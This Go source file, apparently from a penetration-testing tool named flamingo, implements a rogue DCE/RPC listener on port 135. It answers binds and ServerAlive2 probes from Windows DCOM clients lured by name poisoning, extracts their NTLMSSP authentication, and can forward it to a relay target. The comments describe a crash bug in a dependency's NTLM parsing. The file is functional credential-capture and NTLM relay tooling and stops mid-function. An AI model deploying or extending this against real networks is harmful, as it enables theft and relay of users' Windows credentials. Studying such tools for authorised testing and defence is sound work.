package flamingo

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
	"unicode/utf16"

	"github.com/mandiant/gopacket/pkg/relay"
	log "github.com/sirupsen/logrus"
)

// ConfMSRPC holds the configuration for an MSRPC capture server.
//
// The listener speaks DCE/RPC over TCP (MS-RPCE) itself: it answers BIND and
// ALTER_CONTEXT, carries the NTLMSSP CHALLENGE back in the BIND_ACK or
// ALTER_CONTEXT_RESP authentication verifier, and reads the AUTHENTICATE out
// of the AUTH3 that follows. Everything past that — the credential itself —
// is flamingo's NTLM core, through NTLMCapture.
//
// gopacket's relay.NewRPCRelayServer covers the same protocol, and this
// listener was built on it to begin with. It is not any more:
// relay.extractNTLMType3Info (client.go:544) bounds-checks an NTLM security
// buffer with int arithmetic and then slices with the raw uint32, so where int
// is 32 bits an offset near 2^32 converts to a negative number, passes the
// check and panics the slice. rpc_server.go calls it on a message supplied by
// whoever connected, on a goroutine no recover() of ours can reach, which
// would end a capture run from one packet. The protocol is small enough to
// own, so flamingo owns it, and the 386 and arm builds get MSRPC back.
type ConfMSRPC struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter

	// Responder decides the challenge a victim is answered with and whether
	// it is told the logon succeeded. Nil — the default — is capture only.
	// A relay responder makes this listener forward to a target instead; it
	// rides the same NTLMCapture seam as capture, so nothing else changes.
	Responder NTLMResponder

	capture  *NTLMCapture
	shutdown bool
	m        sync.Mutex
}

// NewConfMSRPC creates a default configuration for the MSRPC capture server.
func NewConfMSRPC() *ConfMSRPC {
	return &ConfMSRPC{
		BindPort: 135,
		BindHost: "[::]",
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfMSRPC) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfMSRPC) Shutdown() {
	c.m.Lock()
	capture := c.capture
	if c.shutdown {
		c.m.Unlock()
		return
	}
	c.shutdown = true
	c.m.Unlock()

	if capture != nil {
		capture.Stop()
	}
}

// SpawnMSRPC starts a logging MSRPC server on TCP, normally port 135.
func SpawnMSRPC(c *ConfMSRPC) error {
	addr := fmt.Sprintf("%s:%d", c.BindHost, c.BindPort)
	capture := NewNTLMCapture("msrpc", addr, c.RecordWriter)
	capture.Responder = c.Responder

	c.m.Lock()
	if c.shutdown {
		c.m.Unlock()
		return errors.New("msrpc is shut down")
	}
	c.capture = capture
	c.m.Unlock()

	if err := capture.Start(newMSRPCServer(addr)); err != nil {
		return err
	}
	log.Debugf("msrpc is listening on %s", addr)
	return nil
}

// DCE/RPC PDU types (C706 12.1, MS-RPCE 2.2.2.3). The bind path is what earns
// the credential; REQUEST and RESPONSE are here only so that the probe a DCOM
// client makes before it authenticates is answered rather than refused.
const (
	rpcPktRequest       = 0
	rpcPktResponse      = 2
	rpcPktFault         = 3
	rpcPktBind          = 11
	rpcPktBindAck       = 12
	rpcPktBindNak       = 13
	rpcPktAlterContext  = 14
	rpcPktAlterContextR = 15
	rpcPktAuth3         = 16
)

// PFC flags carried in the common header.
const (
	rpcFlagFirstFrag = 0x01
	rpcFlagLastFrag  = 0x02
	rpcFlagDidNotRun = 0x20
)

// Authentication service identifiers (MS-RPCE 2.2.1.1.7). NTLMSSP is
// RPC_C_AUTHN_WINNT; a client that asks for the default service gets the same
// treatment, since NTLMSSP is all this listener offers.
const (
	rpcAuthWinNT   = 10
	rpcAuthDefault = 0xff
)

// Presentation context result codes (C706 12.6.4.4).
const (
	rpcContextAccept       = 0
	rpcContextProvReject   = 2
	rpcContextNegotiateAck = 3
)

// BIND_NAK reject reasons (C706 12.6.4.5).
const (
	rpcRejectNotSpecified  = 0
	rpcRejectAuthTypeUnrec = 8
)

// Fault status codes placed in the FAULT PDU. nca_s_op_rng_error is the
// honest answer to a call flamingo does not implement: the association is
// fine, the operation is not, so the client is free to carry on.
const (
	rpcStatusAccessDenied = 0x00000005
	rpcStatusOpRngError   = 0x1c010002
	rpcStatusProtoError   = 0x1c01000b
)

// rpcObjectExporterIID is IObjectExporter (IOXIDResolver),
// 99fcfec4-5260-101b-bbcb-00aa0021347a, in the little-endian wire encoding a
// client puts in a presentation context's abstract syntax. This is the
// interface a DCOM client binds to on 135 before it does anything else.
var rpcObjectExporterIID = []byte{
	0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10,
	0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a,
}

// rpcOpnumServerAlive2 is IObjectExporter::ServerAlive2 (MS-DCOM 3.1.2.5.1.4).
// It is the one call this listener answers: a client that pings the resolver
// before it authenticates has to be satisfied, or it never gets as far as the
// NTLMSSP exchange.
const rpcOpnumServerAlive2 = 5

// ServerAlive2 reply constants.
const (
	// The COMVERSION of the object resolver (MS-DCOM 2.2.11). 5.7 is what
	// current Windows reports, and 5.6 is the version that introduced
	// ServerAlive2 in the first place.
	rpcComVersionMajor = 5
	rpcComVersionMinor = 7

	// rpcTowerIDTCP is the ncacn_ip_tcp protocol sequence identifier placed
	// in a STRINGBINDING's wTowerId (C706 Appendix I table I-2).
	rpcTowerIDTCP = 0x07

	// rpcSecBindingReserved is the SECURITYBINDING Reserved field
	// (MS-DCOM 2.2.19.4). It is present whenever wAuthnSvc is not
	// RPC_C_AUTHN_NONE and MUST be 0xffff.
	rpcSecBindingReserved = 0xffff

	// rpcReferentID is the referent identifier of the one unique pointer in
	// the ServerAlive2 reply. Any non-zero value will do; this is the one
	// MIDL-generated stubs hand out first.
	rpcReferentID = 0x00020000
)

// rpcNDR64Syntax is the NDR64 transfer syntax, 71710533-beba-4937-8319-
// b5dbef9ccc36. It is refused: flamingo never carries a call, and a client
// that is told NDR64 was accepted encodes everything differently for no gain.
var rpcNDR64Syntax = []byte{
	0x33, 0x05, 0x71, 0x71, 0xba, 0xbe, 0x37, 0x49,
	0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36,
}

// rpcBindTimeFeaturePrefix is the first half of the bind time feature
// negotiation UUID, 6cb71c2c-9812-4540-*. Windows clients offer it as an extra
// transfer syntax and expect the negotiate-ack result rather than an accept.
var rpcBindTimeFeaturePrefix = []byte{0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45}

// rpcBindTimeFeatureBitmask is the feature set acknowledged in the reason
// field of a negotiate-ack: security context multiplexing and keeping the
// connection on orphan.
const rpcBindTimeFeatureBitmask = 0x03

// Per-connection limits. A real DCOM client's probe flow is an unauthenticated
// bind, a ServerAlive2 call, an authenticated bind and an AUTH3, with room for
// a repeat or two, so cap the fragment size, the number of PDUs and the time
// one client may hold a goroutine. Every one of these is the only thing
// standing between a hostile peer and an unbounded allocation or an idle
// goroutine.
const (
	msrpcTimeout     = 30 * time.Second
	msrpcMaxFrag     = 16 * 1024
	msrpcMaxPDUs     = 16
	msrpcMaxContexts = 32
)

// msrpcMaxXmitFrag is the fragment size offered back to the client. It is
// Windows' own default and is never exceeded by anything this listener writes.
const msrpcMaxXmitFrag = 4280

// msrpcByteOrder is a byte order that can also append, which binary.ByteOrder
// alone cannot. Both binary.LittleEndian and binary.BigEndian satisfy it.
type msrpcByteOrder interface {
	binary.ByteOrder
	binary.AppendByteOrder
}

// msrpcServer is flamingo's DCE/RPC listener. It implements
// relay.ProtocolServer, so it plugs into NTLMCapture exactly like upstream's
// servers do and the relay phase can drive it unchanged.
type msrpcServer struct {
	listenAddr string

	// secondaryAddr is the port string reported in the BIND_ACK. Windows
	// returns the endpoint the association is bound to, which for a capture
	// is the port flamingo is listening on.
	secondaryAddr string

	listener  net.Listener
	results   chan<- relay.AuthResult
	done      chan struct{}
	closeOnce sync.Once
}

func newMSRPCServer(listenAddr string) *msrpcServer {
	port := "135"
	if _, p, err := net.SplitHostPort(listenAddr); err == nil && p != "" {
		port = p
	}
	return &msrpcServer{listenAddr: listenAddr, secondaryAddr: port, done: make(chan struct{})}
}

// Start begins listening, implementing relay.ProtocolServer.
func (s *msrpcServer) Start(results chan<- relay.AuthResult) error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return err
	}
	s.listener = ln
	s.results = results
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go s.handleConnection(conn)
		}
	}()
	return nil
}

// Stop closes the listener, implementing relay.ProtocolServer. Connections
// already accepted run out their own deadlines.
func (s *msrpcServer) Stop() error {
	s.closeOnce.Do(func() { close(s.done) })
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// msrpcPDU is one parsed DCE/RPC fragment: the common header fields that
// matter and the raw bytes, which are exactly frag_length long.
type msrpcPDU struct {
	raw     []byte
	ptype   byte
	drep    [4]byte
	bo      msrpcByteOrder
	authLen int
	callID  uint32
}

// errNoVerifier reports a PDU that carries no authentication verifier.
var errNoVerifier = errors.New("no authentication verifier")

// body returns the PDU body: everything between the common header and the
// security trailer, or the end of the fragment when there is no verifier.
func (p *msrpcPDU) body() []byte {
	end := len(p.raw)
	if p.authLen > 0 {
		end -= p.authLen + 8
	}
	if end < 16 {
		return nil
	}
	return p.raw[16:end]
}

// verifier returns the sec_trailer fields and the authentication verifier
// bytes that follow it.
//
// This is the bounds check the whole rewrite exists for. auth_length is
// attacker-controlled, and so is frag_length, so the trailer offset is
// computed from the bytes actually read — len(p.raw), which msrpcReadPDU
// guarantees equals frag_length — in int arithmetic over values that cannot
// exceed msrpcMaxFrag. Nothing here converts a wire uint32 into an index, and
// the slice bounds are checked before they are taken, not after.
func (p *msrpcPDU) verifier() (authType, authLevel byte, ctxID uint32, data []byte, err error) {
	if p.authLen == 0 {
		return 0, 0, 0, nil, errNoVerifier
	}
	off := len(p.raw) - p.authLen - 8
	if off < 16 || off+8 > len(p.raw) {
		return 0, 0, 0, nil, fmt.Errorf("auth_length %d does not fit a %d byte fragment",
			p.authLen, len(p.raw))
	}
	trailer := p.raw[off : off+8]
	return trailer[0], trailer[1], p.bo.Uint32(trailer[4:8]), p.raw[off+8:], nil
}

// msrpcReadPDU reads one DCE/RPC fragment, validating every length it is told
// before acting on it.
func msrpcReadPDU(r io.Reader) (*msrpcPDU, error) {
	var hdr [16]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return nil, err
	}
	if hdr[0] != 5 {
		return nil, fmt.Errorf("RPC version %d.%d is not 5", hdr[0], hdr[1])
	}

	// drep[0]'s high nibble is the integer representation: 0 is big-endian,
	// 1 little-endian. Clients are overwhelmingly little-endian, but the
	// field is there to be honoured, so every length in this PDU and every
	// length written back is read and written in the order it names.
	p := &msrpcPDU{ptype: hdr[2]}
	copy(p.drep[:], hdr[4:8])
	switch hdr[4] >> 4 {
	case 0:
		p.bo = binary.BigEndian
	case 1:
		p.bo = binary.LittleEndian
	default:
		return nil, fmt.Errorf("unknown data representation 0x%02x", hdr[4])
	}

	fragLen := int(p.bo.Uint16(hdr[8:10]))
	p.authLen = int(p.bo.Uint16(hdr[10:12]))
	p.callID = p.bo.Uint32(hdr[12:16])

	if fragLen < 16 {
		return nil, fmt.Errorf("fragment length %d is shorter than the header", fragLen)
	}
	if fragLen > msrpcMaxFrag {
		return nil, fmt.Errorf("fragment length %d exceeds the %d byte limit", fragLen, msrpcMaxFrag)
	}
	// The verifier and its 8-byte trailer have to live inside the fragment,
	// after the header. A client that says otherwise is refused here rather
	// than producing a negative offset later.
	if p.authLen > 0 && p.authLen+8 > fragLen-16 {
		return nil, fmt.Errorf("auth_length %d does not fit a %d byte fragment", p.authLen, fragLen)
	}

	p.raw = make([]byte, fragLen)
	copy(p.raw, hdr[:])
	if fragLen > 16 {
		if _, err := io.ReadFull(r, p.raw[16:]); err != nil {
			return nil, err
		}
	}
	return p, nil
}

// msrpcCtxResult is one entry of a BIND_ACK presentation context result list.
type msrpcCtxResult struct {
	result uint16
	reason uint16
	syntax [20]byte
}

// msrpcContextResults parses the presentation context list of a BIND or
// ALTER_CONTEXT body and builds the matching result list. Every offset is
// checked against the body, the item count is capped, and a truncated list
// ends the loop rather than the process.
//
// iface is the 16-byte abstract syntax UUID of the first context that was
// accepted, which is how a REQUEST arriving later on the same connection is
// matched to an interface. Clients that reach this listener offer a single
// context, so one interface per association is all that is tracked.
func msrpcContextResults(body []byte, bo msrpcByteOrder) (out []msrpcCtxResult, iface []byte) {
	if len(body) < 12 {
		return nil, nil
	}
	n := int(body[8])
	if n > msrpcMaxContexts {
		n = msrpcMaxContexts
	}

	off := 12
	for i := 0; i < n; i++ {
		// p_cont_id(2) + n_transfer_syn(1) + reserved(1) + abstract(20).
		if off+24 > len(body) {
			break
		}
		syntaxes := int(body[off+2])
		abstract := body[off+4 : off+20]
		off += 24
		if syntaxes > msrpcMaxContexts {
			break
		}
		if off+syntaxes*20 > len(body) {
			break
		}

		var res msrpcCtxResult
		res.result = rpcContextProvReject
		res.reason = 2 // proposed transfer syntaxes not supported
		for j := 0; j < syntaxes; j++ {
			syn := body[off+j*20 : off+j*20+20]
			switch {
			case msrpcIsBindTimeFeature(syn, bo):
				// Acknowledge the feature bitmask, with a zero syntax.
				if res.result != rpcContextAccept {
					res.result = rpcContextNegotiateAck
					res.reason = rpcBindTimeFeatureBitmask
					res.syntax = [20]byte{}
				}
			case bytes.Equal(syn[:16], rpcNDR64Syntax):
				// Left refused.
			default:
				res.result = rpcContextAccept
				res.reason = 0
				copy(res.syntax[:], syn)
			}
			if res.result == rpcContextAccept {
				break
			}
		}
		off += syntaxes * 20
		if res.result == rpcContextAccept && iface == nil {
			iface = abstract
		}
		out = append(out, res)
	}
	return out, iface
}

// msrpcIsObjectExporter reports whether an abstract syntax UUID names
// IObjectExporter. A UUID is NDR-encoded, so its first three fields follow the
// client's data representation; both encodings are recognised rather than
// turning a byte order quirk into a refused probe.
func msrpcIsObjectExporter(iface []byte) bool {
	if len(iface) != 16 {
		return false
	}
	if bytes.Equal(iface, rpcObjectExporterIID) {
		return true
	}
	var swapped [16]byte
	copy(swapped[:], rpcObjectExporterIID)
	swapped[0], swapped[1], swapped[2], swapped[3] = swapped[3], swapped[2], swapped[1], swapped[0]
	swapped[4], swapped[5] = swapped[5], swapped[4]
	swapped[6], swapped[7] = swapped[7], swapped[6]
	return bytes.Equal(iface, swapped[:])
}

// msrpcIsBindTimeFeature reports whether a transfer syntax is a bind time
// feature negotiation request.
func msrpcIsBindTimeFeature(syn []byte, bo msrpcByteOrder) bool {
	return len(syn) == 20 && bytes.Equal(syn[:8], rpcBindTimeFeaturePrefix) &&
		bo.Uint32(syn[16:20]) == 1
}

// handleConnection runs the bind exchange for one client, handing the NTLM
// messages to the capture adapter.
//
// A client that binds with an NTLMSSP NEGOTIATE in its verifier is answered
// with the CHALLENGE and its AUTHENTICATE is read out of the AUTH3 (or the
// ALTER_CONTEXT some clients send instead). Everything else is about getting
// that client as far as the NEGOTIATE in the first place: a Windows DCOM
// client that resolved a poisoned name to flamingo commonly binds without
// authentication and pings IObjectExporter before it offers a credential, so
// an unauthenticated bind is acked, ServerAlive2 is answered, and a call this
// listener does not implement is faulted without hanging up. A BIND_NAK is
// reserved for a bind there is no way to answer at all.
func (s *msrpcServer) handleConnection(conn net.Conn) {
	defer conn.Close()

	// One deadline for the whole exchange, so a client cannot keep a
	// goroutine alive by trickling bytes.
	conn.SetDeadline(time.Now().Add(msrpcTimeout))

	var auth relay.AuthResult
	negotiated, delivered := false, false

	// The abstract syntax of the accepted presentation context, so a REQUEST
	// that arrives later is only answered on the interface it belongs to.
	var iface []byte

	// Once the exchange has been handed over, the adapter is waiting on
	// Type3Ch. Closing that channel on every path that never gets there —
	// including a bind ack that could not be written — releases it at once
	// instead of leaving it to time out.
	defer func() {
		if negotiated && !delivered {
			close(auth.Type3Ch)
		}
	}()

	for i := 0; i < msrpcMaxPDUs; i++ {
		pdu, err := msrpcReadPDU(conn)
		if err != nil {
			log.Debugf("msrpc read from %s: %s", conn.RemoteAddr(), err)
			return
		}

		switch pdu.ptype {
		case rpcPktBind, rpcPktAlterContext:
			msg, authType, authLevel, ctxID, state := s.bindToken(conn, pdu)
			if state == msrpcBindRefused {
				return
			}

			results, accepted := msrpcContextResults(pdu.body(), pdu.bo)
			if accepted != nil {
				iface = accepted
			}

			if state == msrpcBindAnonymous {
				// No credential in this one, but the association is
				// perfectly usable and the client is very likely about to
				// probe and then authenticate on it.
				if err := s.writeBindAck(conn, pdu, results, 0, 0, 0, nil); err != nil {
					log.Debugf("msrpc writing a bind ack to %s: %s", conn.RemoteAddr(), err)
					return
				}
				continue
			}

			switch NTLMMessageType(msg) {
			case NTLMTypeNegotiate:
				if negotiated {
					// One NEGOTIATE per connection. A second one would
					// strand the first exchange's goroutine.
					msrpcWriteFault(conn, pdu, rpcStatusProtoError)
					return
				}
				var pushed, ok bool
				auth, pushed, ok = s.negotiate(conn, pdu, msg, results, authType, authLevel, ctxID)
				// The flag follows the hand-over, not the reply: once the
				// adapter holds the exchange it is this goroutine's job to
				// release it however the rest of the connection goes.
				negotiated = pushed
				if !ok {
					return
				}

			case NTLMTypeAuthenticate:
				// Some clients carry the AUTHENTICATE in an ALTER_CONTEXT
				// rather than an AUTH3. One that arrives before any
				// NEGOTIATE has no challenge behind it and is nobody's
				// credential, so the association is acked without security
				// and the client is left free to start over.
				if !negotiated {
					log.Debugf("msrpc bind from %s carries an AUTHENTICATE with no NEGOTIATE",
						conn.RemoteAddr())
					if err := s.writeBindAck(conn, pdu, results, 0, 0, 0, nil); err != nil {
						return
					}
					continue
				}
				delivered = true
				s.finish(conn, pdu, auth, msg)
				return

			default:
				log.Debugf("msrpc bind from %s carries NTLM message type %d",
					conn.RemoteAddr(), NTLMMessageType(msg))
				if err := s.writeBindAck(conn, pdu, results, 0, 0, 0, nil); err != nil {
					return
				}
			}

		case rpcPktRequest:
			// A call flamingo does not implement is faulted, not hung up
			// on: the credential comes from a bind, and a client that is
			// still connected can still make one.
			s.request(conn, pdu, iface)

		case rpcPktAuth3:
			if !negotiated {
				log.Debugf("msrpc AUTH3 from %s before any bind", conn.RemoteAddr())
				msrpcWriteFault(conn, pdu, rpcStatusProtoError)
				return
			}
			_, _, _, data, err := pdu.verifier()
			if err != nil {
				log.Debugf("msrpc AUTH3 from %s: %s", conn.RemoteAddr(), err)
				msrpcWriteFault(conn, pdu, rpcStatusAccessDenied)
				return
			}
			msg := FindNTLMSSP(data)
			if NTLMMessageType(msg) != NTLMTypeAuthenticate {
				log.Debugf("msrpc AUTH3 from %s carries no AUTHENTICATE", conn.RemoteAddr())
				msrpcWriteFault(conn, pdu, rpcStatusAccessDenied)
				return
			}
			delivered = true
			s.finish(conn, pdu, auth, msg)
			return

		default:
			log.Debugf("msrpc PDU type %d from %s", pdu.ptype, conn.RemoteAddr())
			msrpcWriteFault(conn, pdu, rpcStatusProtoError)
			return
		}
	}
	log.Debugf("msrpc client %s sent %d PDUs without authenticating", conn.RemoteAddr(), msrpcMaxPDUs)
}

// msrpcBindState is what bindToken made of a BIND or ALTER_CONTEXT.
type msrpcBindState int

const (
	// msrpcBindRefused: the bind cannot be answered at all. A BIND_NAK has
	// already been written and the connection is finished.
	msrpcBindRefused msrpcBindState = iota

	// msrpcBindAnonymous: a well-formed bind carrying no authentication
	// verifier. It gets an ordinary BIND_ACK with no security on it.
	msrpcBindAnonymous

	// msrpcBindNTLM: the verifier carries an NTLMSSP message.
	msrpcBindNTLM
)

// bindToken pulls the NTLMSSP message out of a BIND or ALTER_CONTEXT
// authentication verifier and reports what the caller is holding.
//
// The refusals are the ones with no other answer: an auth_length that does not
// fit its own fragment, an authentication service this listener cannot speak,
// and verifier bytes with no NTLMSSP message anywhere in them. A bind with no
// verifier at all is not one of them — refusing those is what used to lose
// captures, because the DCOM client that probes before it authenticates gives
// up at the NAK and never comes back.
func (s *msrpcServer) bindToken(conn net.Conn, pdu *msrpcPDU) (msg []byte, authType, authLevel byte, ctxID uint32, state msrpcBindState) {
	authType, authLevel, ctxID, data, err := pdu.verifier()
	switch {
	case errors.Is(err, errNoVerifier):
		return nil, 0, 0, 0, msrpcBindAnonymous
	case err != nil:
		// auth_length is a lie about this fragment; there is nothing to
		// read and nothing honest to ack.
		log.Debugf("msrpc bind from %s: %s", conn.RemoteAddr(), err)
		msrpcWriteBindNak(conn, pdu, rpcRejectNotSpecified)
		return nil, 0, 0, 0, msrpcBindRefused
	}
	if authType != rpcAuthWinNT && authType != rpcAuthDefault {
		log.Debugf("msrpc bind from %s asks for authentication service %d", conn.RemoteAddr(), authType)
		msrpcWriteBindNak(conn, pdu, rpcRejectAuthTypeUnrec)
		return nil, 0, 0, 0, msrpcBindRefused
	}
	if msg = FindNTLMSSP(data); msg == nil {
		log.Debugf("msrpc bind verifier from %s is not NTLMSSP", conn.RemoteAddr())
		msrpcWriteBindNak(conn, pdu, rpcRejectAuthTypeUnrec)
		return nil, 0, 0, 0, msrpcBindRefused
	}
	return msg, rpcAuthWinNT, authLevel, ctxID, msrpcBindNTLM
}

// writeBindAck answers a BIND with a BIND_ACK or an ALTER_CONTEXT with an
// ALTER_CONTEXT_RESP, carrying challenge in the authentication verifier when
// there is one and no verifier at all when challenge is empty.
func (s *msrpcServer) writeBindAck(conn net.Conn, pdu *msrpcPDU, results []msrpcCtxResult,
	authType, authLevel byte, ctxID uint32, challenge []byte) error {

	respType := byte(rpcPktBindAck)
	secAddr := s.secondaryAddr
	if pdu.ptype == rpcPktAlterContext {
		// An ALTER_CONTEXT_RESP carries an empty secondary address.
		respType = rpcPktAlterContextR
		secAddr = ""
	}
	_, err := conn.Write(msrpcBindAck(pdu, respType, secAddr, results, authType, authLevel, ctxID, challenge))
	return err
}

// negotiate hands the NEGOTIATE to the capture adapter and answers the client
// with the CHALLENGE it supplies, in a BIND_ACK or an ALTER_CONTEXT_RESP to
// match what was asked. pushed reports whether the adapter took the exchange,
// which is what makes the caller responsible for releasing it.
func (s *msrpcServer) negotiate(conn net.Conn, pdu *msrpcPDU, type1 []byte, results []msrpcCtxResult,
	authType, authLevel byte, ctxID uint32) (auth relay.AuthResult, pushed, ok bool) {

	auth = relay.AuthResult{
		NTLMType1:  type1,
		SourceAddr: conn.RemoteAddr().String(),
		ServerConn: conn,
		Type2Ch:    make(chan []byte, 1),
		Type3Ch:    make(chan []byte, 1),
		ResultCh:   make(chan bool, 1),
	}
	select {
	case s.results <- auth:
		pushed = true
	case <-s.done:
		return auth, false, false
	}

	challenge, open := <-auth.Type2Ch
	if !open {
		// The adapter gave up on this victim and has already released both
		// ends, so there is nothing left for the caller to close.
		return auth, false, false
	}
	if challenge == nil {
		// A responder that answered with nothing. It is still parked on
		// Type3Ch, so the caller has to release it.
		return auth, true, false
	}

	if err := s.writeBindAck(conn, pdu, results, authType, authLevel, ctxID, challenge); err != nil {
		log.Debugf("msrpc writing a bind ack to %s: %s", conn.RemoteAddr(), err)
		return auth, true, false
	}
	return auth, true, true
}

// request answers a REQUEST PDU. IObjectExporter::ServerAlive2 is the one call
// this listener implements, because it is the one a DCOM client makes before
// it authenticates; everything else is faulted with nca_s_op_rng_error and the
// connection is left open, so a probe flamingo does not carry is not a reason
// for the client to go away.
func (s *msrpcServer) request(conn net.Conn, pdu *msrpcPDU, iface []byte) {
	body := pdu.body()
	// alloc_hint(4) + p_cont_id(2) + opnum(2).
	if len(body) < 8 {
		log.Debugf("msrpc REQUEST from %s has a %d byte body", conn.RemoteAddr(), len(body))
		msrpcWriteFault(conn, pdu, rpcStatusProtoError)
		return
	}
	ctxID := pdu.bo.Uint16(body[4:6])
	opnum := pdu.bo.Uint16(body[6:8])

	if iface == nil {
		log.Debugf("msrpc REQUEST from %s before any accepted bind", conn.RemoteAddr())
		msrpcWriteFault(conn, pdu, rpcStatusProtoError)
		return
	}
	if opnum != rpcOpnumServerAlive2 || !msrpcIsObjectExporter(iface) {
		log.Debugf("msrpc REQUEST from %s for opnum %d on %x", conn.RemoteAddr(), opnum, iface)
		msrpcWriteFault(conn, pdu, rpcStatusOpRngError)
		return
	}
	if _, err := conn.Write(msrpcServerAlive2(pdu, ctxID)); err != nil {
		log.Debugf("msrpc writing a ServerAlive2 response to %s: %s", conn.RemoteAddr(), err)
	}
}

// finish hands the AUTHENTICATE to the adapter and reports the outcome to the
// client. An AUTH3 gets no reply when the logon is accepted, which is what the
// protocol says; a refusal is a FAULT, so a client fails rather than waiting
// out its own timeout.
func (s *msrpcServer) finish(conn net.Conn, pdu *msrpcPDU, auth relay.AuthResult, type3 []byte) {
	auth.Type3Ch <- type3

	var success bool
	select {
	case success = <-auth.ResultCh:
	case <-s.done:
	}
	if !success {
		// Capture only: the credential is recorded, so the logon is refused.
		msrpcWriteFault(conn, pdu, rpcStatusAccessDenied)
	}
}

// msrpcHeader builds the 16-byte common header of a response, echoing the
// client's data representation and call identifier.
func msrpcHeader(pdu *msrpcPDU, ptype byte, flags byte, fragLen, authLen int) []byte {
	h := make([]byte, 16)
	h[0] = 5
	h[1] = 0
	h[2] = ptype
	h[3] = flags
	copy(h[4:8], pdu.drep[:])
	pdu.bo.PutUint16(h[8:10], uint16(fragLen))
	pdu.bo.PutUint16(h[10:12], uint16(authLen))
	pdu.bo.PutUint32(h[12:16], pdu.callID)
	return h
}

// msrpcBindAck builds a BIND_ACK or ALTER_CONTEXT_RESP, carrying the NTLMSSP
// CHALLENGE in its authentication verifier. An empty challenge produces an
// ordinary acknowledgement with auth_length 0 and no sec_trailer, which is
// what an unauthenticated bind gets.
func msrpcBindAck(pdu *msrpcPDU, ptype byte, secAddr string, results []msrpcCtxResult,
	authType, authLevel byte, ctxID uint32, challenge []byte) []byte {

	bo := pdu.bo
	body := make([]byte, 0, 64+len(results)*24)
	body = bo.AppendUint16(body, msrpcMaxXmitFrag)
	body = bo.AppendUint16(body, msrpcMaxXmitFrag)
	body = bo.AppendUint32(body, 0x12345678) // assoc_group_id

	// port_any_t: a counted, null-terminated string, then padding back to a
	// four-byte boundary.
	if secAddr == "" {
		body = bo.AppendUint16(body, 0)
	} else {
		body = bo.AppendUint16(body, uint16(len(secAddr)+1))
		body = append(body, secAddr...)
		body = append(body, 0)
	}
	for len(body)%4 != 0 {
		body = append(body, 0)
	}

	body = append(body, byte(len(results)), 0, 0, 0)
	for _, r := range results {
		body = bo.AppendUint16(body, r.result)
		body = bo.AppendUint16(body, r.reason)
		body = append(body, r.syntax[:]...)
	}

	if len(challenge) == 0 {
		out := msrpcHeader(pdu, ptype, rpcFlagFirstFrag|rpcFlagLastFrag, 16+len(body), 0)
		return append(out, body...)
	}

	// The verifier is four-byte aligned, and the pad is declared in the
	// trailer so the client knows where the body really ended.
	pad := (4 - len(body)%4) % 4
	for i := 0; i < pad; i++ {
		body = append(body, 0)
	}
	trailer := []byte{authType, authLevel, byte(pad), 0, 0, 0, 0, 0}
	bo.PutUint32(trailer[4:8], ctxID)

	fragLen := 16 + len(body) + len(trailer) + len(challenge)
	out := msrpcHeader(pdu, ptype, rpcFlagFirstFrag|rpcFlagLastFrag, fragLen, len(challenge))
	out = append(out, body...)
	out = append(out, trailer...)
	return append(out, challenge...)
}

// msrpcWriteBindNak refuses a bind. The nak carries the reject reason and the
// RPC versions this listener speaks.
func msrpcWriteBindNak(conn net.Conn, pdu *msrpcPDU, reason uint16) {
	body := pdu.bo.AppendUint16(nil, reason)
	body = append(body, 1, 5, 0) // one protocol version: 5.0
	out := msrpcHeader(pdu, rpcPktBindNak, rpcFlagFirstFrag|rpcFlagLastFrag, 16+len(body), 0)
	conn.Write(append(out, body...))
}

// msrpcServerAlive2 builds the RESPONSE to IObjectExporter::ServerAlive2.
func msrpcServerAlive2(pdu *msrpcPDU, ctxID uint16) []byte {
	stub := msrpcServerAlive2Stub(pdu.bo, NTLMConf.NetBIOSComputerName)

	// RESPONSE body: alloc_hint(4) + p_cont_id(2) + cancel_count(1) +
	// reserved(1), then the stub (C706 12.6.4.10).
	body := make([]byte, 0, 8+len(stub))
	body = pdu.bo.AppendUint32(body, uint32(len(stub)))
	body = pdu.bo.AppendUint16(body, ctxID)
	body = append(body, 0, 0)
	body = append(body, stub...)

	out := msrpcHeader(pdu, rpcPktResponse, rpcFlagFirstFrag|rpcFlagLastFrag, 16+len(body), 0)
	return append(out, body...)
}

// msrpcServerAlive2Stub marshals the three output parameters of ServerAlive2
// in NDR, in the client's byte order:
//
//	[out, ref] COMVERSION* pComVersion
//	[out, ref] DUALSTRINGARRAY** ppdsaOrBindings
//	[out, ref] DWORD* pReserved
//
// then the error_status_t return value. The ref pointers themselves are not
// marshalled; the inner DUALSTRINGARRAY pointer is unique, so it is a referent
// id followed by the conformant array's max_count and the structure itself
// (MS-DCOM 2.2.19.2). The DUALSTRINGARRAY holds one STRINGBINDING naming this
// host over ncacn_ip_tcp with no endpoint, which is what ServerAlive2 bindings
// are required to look like, and one SECURITYBINDING naming NTLMSSP with an
// empty principal name. Each section is terminated by a zero entry
// (MS-DCOM 2.2.19.1).
//
// The address advertised is the NTLM identity flamingo already presents rather
// than a literal address: it is the name the CHALLENGE carries, and with the
// poisoners running it resolves straight back here.
func msrpcServerAlive2Stub(bo msrpcByteOrder, name string) []byte {
	arr := make([]uint16, 0, 8+len(name))
	arr = append(arr, rpcTowerIDTCP)
	arr = append(arr, utf16.Encode([]rune(name))...)
	arr = append(arr, 0) // aNetworkAddr terminator
	arr = append(arr, 0) // nullterm1: end of the STRINGBINDING entries

	secOffset := len(arr)
	arr = append(arr, rpcAuthWinNT, rpcSecBindingReserved, 0) // wAuthnSvc, Reserved, empty aPrincName
	arr = append(arr, 0)                                      // nullterm2: end of the SECURITYBINDING entries

	out := make([]byte, 0, 24+2*len(arr))
	out = bo.AppendUint16(out, rpcComVersionMajor)
